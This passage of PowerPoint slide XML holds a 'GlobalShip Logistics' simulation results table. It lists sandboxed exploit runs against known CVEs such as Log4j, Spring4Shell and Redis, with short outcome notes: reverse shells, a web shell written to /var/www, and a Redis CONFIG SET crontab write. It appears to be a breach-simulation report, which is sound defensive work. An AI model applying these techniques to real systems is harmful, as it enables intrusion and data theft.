              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Across all runs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9738360" y="2148840"/>
            <a:ext cx="2194560" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="762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38360" y="2148840"/>
            <a:ext cx="2194560" cy="36576"/>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8088" y="2240280"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Avg Duration</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9848088" y="2423160"/>
            <a:ext cx="1975104" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2.3s</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9848088" y="2706624"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Per simulation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="301752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54096"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Simulation Results — GlobalShip Logistics (All Runs)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3291840"/>
            <a:ext cx="11978639"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37560"/>
            <a:ext cx="1783079" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SANDBOX ID</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2167127" y="3337560"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584447" y="3337560"/>
            <a:ext cx="1143000" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TECHNIQUE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818887" y="3337560"/>
            <a:ext cx="822960" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RESULT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733287" y="3337560"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CONFIDENCE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6693407" y="3337560"/>
            <a:ext cx="749808" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DURATION</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534655" y="3337560"/>
            <a:ext cx="4645152" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WHAT IT PROVED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Rectangle 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3547872"/>
            <a:ext cx="1197863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2608" y="3584448"/>
            <a:ext cx="1783079" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sandbox-logistics-001</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="TextBox 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2167127" y="3584448"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2021-44228</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584447" y="3584448"/>
            <a:ext cx="1143000" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1190 Initial Access</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="TextBox 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818887" y="3584448"/>
            <a:ext cx="822960" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXPLOITED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="TextBox 48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733287" y="3584448"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>91%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="TextBox 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6693407" y="3584448"/>
            <a:ext cx="749808" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2.1s</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="TextBox 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534655" y="3584448"/>
            <a:ext cx="4645152" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Log4j JNDI payload triggered reverse shell on ERPNext. All shipment data accessible.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Rectangle 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3803904"/>
            <a:ext cx="1197863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92608" y="3840480"/>
            <a:ext cx="1783079" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sandbox-logistics-002</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2167127" y="3840480"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2022-22965</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584447" y="3840480"/>
            <a:ext cx="1143000" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1190 Initial Access</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="TextBox 55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818887" y="3840480"/>
            <a:ext cx="822960" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXPLOITED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="TextBox 56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733287" y="3840480"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>94%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="TextBox 57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6693407" y="3840480"/>
            <a:ext cx="749808" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1.9s</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="TextBox 58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534655" y="3840480"/>
            <a:ext cx="4645152" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Spring4Shell data binding RCE. Web shell written to /var/www. Full code execution.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="Rectangle 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4059936"/>
            <a:ext cx="1197863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92608" y="4096512"/>
            <a:ext cx="1783079" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sandbox-logistics-003</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="TextBox 61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2167127" y="4096512"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2022-0543</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="TextBox 62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584447" y="4096512"/>
            <a:ext cx="1143000" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1213 Data from Repos</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="TextBox 63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818887" y="4096512"/>
            <a:ext cx="822960" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXPLOITED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="TextBox 64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733287" y="4096512"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>88%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="TextBox 65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6693407" y="4096512"/>
            <a:ext cx="749808" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3.1s</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="TextBox 66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534655" y="4096512"/>
            <a:ext cx="4645152" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Redis CONFIG SET dir /var/spool/cron — crontab written. Reverse shell in 3 seconds.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Rectangle 67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4315968"/>
            <a:ext cx="1197863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92608" y="4352544"/>
            <a:ext cx="1783079" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sandbox-logistics-004</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="TextBox 69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2167127" y="4352544"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2023-25194</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="TextBox 70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
